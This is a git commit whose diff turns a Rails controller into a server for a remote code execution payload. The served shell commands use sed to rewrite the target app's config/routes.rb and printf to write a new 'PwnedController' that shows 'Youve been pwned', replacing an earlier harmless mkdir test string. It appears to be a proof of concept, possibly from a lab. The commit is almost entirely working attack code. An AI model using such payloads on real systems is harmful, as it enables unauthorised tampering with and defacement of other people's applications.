a4c71eb351943dc3e660b76dbb8ed890c54ee6e7
looneym <looneymicheal@gmail.com>
2018-07-15 17:54:02 +0100

    remote code execution payload

--- app/controllers/welcome_controller.rb
+++ app/controllers/welcome_controller.rb
@@ -1,5 +1,10 @@
 class WelcomeController < ApplicationController
   def index
-    render :text => "mkdir i_was_created_by_the_payload"
+    payload = %{
+    sed -i 's/root to: \"sessions#new\"/root to: \"pwned#pwned\"/g' config/routes.rb
+    printf "class PwnedController < ApplicationController \n def pwned \n  render :inline => 'Youve been pwned' \n end \n end" > app/controllers/pwned_controller.rb
+    }
+    render :inline => payload
+
   end
 end
